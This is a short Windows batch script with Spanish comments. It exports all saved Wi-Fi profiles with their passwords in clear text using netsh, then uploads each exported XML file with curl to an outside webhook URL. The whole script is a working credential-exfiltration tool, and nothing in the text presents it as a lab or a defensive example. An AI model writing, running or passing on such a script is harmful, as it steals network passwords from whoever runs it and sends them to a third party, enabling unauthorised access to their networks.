@echo off
REM — 1) Creamos la carpeta donde esté este .bat (si ya existe, ok)
if not exist "%~dp0" mkdir "%~dp0"

REM — 2) Exportamos TODOS los perfiles Wi-Fi con clave en claro
netsh wlan export profile folder="%~dp0" key=clear

REM — 3) Enviamos cada XML al webhook
for %%F in ("%~dp0*.xml") do (
  curl.exe -H "Content-Type: application/xml" --data-binary "@%%F" ^
    https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64
  echo Enviado %%~nxF
)

REM — 4) Pausamos para que veas los logs
pause
